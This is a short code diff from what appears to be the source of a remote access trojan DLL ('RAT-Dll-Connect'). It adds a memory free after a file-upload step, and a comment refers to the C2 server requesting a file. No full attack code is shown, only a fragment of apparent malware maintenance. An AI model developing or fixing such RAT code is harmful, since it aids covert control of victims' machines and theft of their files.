@@ -186,6 +186,8 @@ INT startListen()
                 }
 
                 OutputDebugStringA("RAT-Dll-Connect::startListen - Successfully put file!\n");
+
+                free(fileBytes);
             }
 
             // C2 told us to get a file so lets get the file path first 
